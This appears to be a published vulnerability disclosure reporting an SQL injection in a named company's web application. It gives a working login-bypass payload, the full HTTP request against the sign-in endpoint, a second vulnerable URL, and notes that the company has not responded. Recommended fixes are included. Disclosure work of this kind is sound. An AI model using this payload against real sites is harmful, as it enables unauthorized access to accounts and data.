## Summary
Due to the lack of input santization it is possible to perform an SQL injection against various end-points on the web application. Using a common SQL injection technique it was possible to bypass authentication and login as an administrative user.

## Proof of Concept

For a proof of concept we will target the `/clients/signin.asp` end-point. It was noted that the following end-point was also vulnerable `/appstoreredirect.asp?id=1`.

To exploit this vulnerability we can simply input `-1' OR 1=1` into the username field and click submit.

The subsequent request will look like the following

```http
POST /clients/signin.asp HTTP/1.1
Host: www.textlogistics.com
Connection: close
Content-Length: 33
Content-Type: application/x-www-form-urlencoded
User-Agent: Hacker 7.23

email=-1%27+OR+1%3D1%16&password=
```

we should receive the following response, indicating we have successfully logged in.

```
HTTP/1.1 302 Object moved

```

It is important to note that while this proof of concept only demonstrates an authentication bypass, it would be possible for an attacker to download the entire application database, make modifications, and even perform remote command execution.


## Recommended Actions
 - Implement proper input santization to prevent SQLi and other injection attacks.
 - Inspect logs to determine if unauthorized access to the database has occurred.
 - Implement security and bug reporting information such as a [security.txt](https://securitytxt.org/) file so security researchers can more easily report findings in the future.
 - Perform a full penetration test of the web platform and API to identify further issues.

## Response From Affected Party
At the time of publishing no response has been received.
